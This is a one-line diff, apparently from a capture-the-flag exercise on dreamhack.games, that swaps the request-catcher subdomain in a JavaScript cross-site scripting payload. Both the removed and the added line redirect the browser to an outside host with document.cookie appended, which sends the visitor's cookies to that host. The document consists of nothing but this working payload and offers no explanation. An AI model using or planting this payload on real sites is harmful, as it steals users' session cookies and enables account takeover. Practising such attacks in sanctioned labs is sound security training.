@@ -1,1 +1,1 @@
-location.href="https://cfciefz.request.dreamhack.games"+document.cookie;
+location.href="https://klmlojv.request.dreamhack.games"+document.cookie;
